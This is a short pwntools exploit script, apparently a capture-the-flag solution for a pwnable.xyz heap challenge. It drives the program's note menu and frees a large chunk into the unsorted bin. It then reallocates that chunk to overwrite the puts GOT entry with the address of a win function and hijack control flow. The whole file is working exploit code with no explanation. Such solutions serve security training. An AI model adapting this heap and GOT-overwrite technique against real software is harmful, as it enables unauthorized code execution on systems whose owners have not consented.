from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30030)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
count = 0x0000000000602264
book = 0x0000000000602280
win = e.symbols['win']

def quit():
	sa('>','0')

def make(size,title,note):
	sa('>','1')
	sa(':',str(size))
	sa(':',title)
	sa(':',note)

def edit(idx,note):
	sa('>','2')
	sa(':',str(idx))
	sa(':',note)

def delete(idx):
	sa('>','3')
	sa(':',str(idx))

def printf(idx):
	sa('>','4')
	sa(':',str(idx))

make(0x420,'A'*4,p64(e.got['puts'])*10)
make(32,'B'*4,'C'*4)
delete(0) # -> unsorted bin
make(0x420,'D'*8,p64(win))
sla('>','99999')

p.interactive()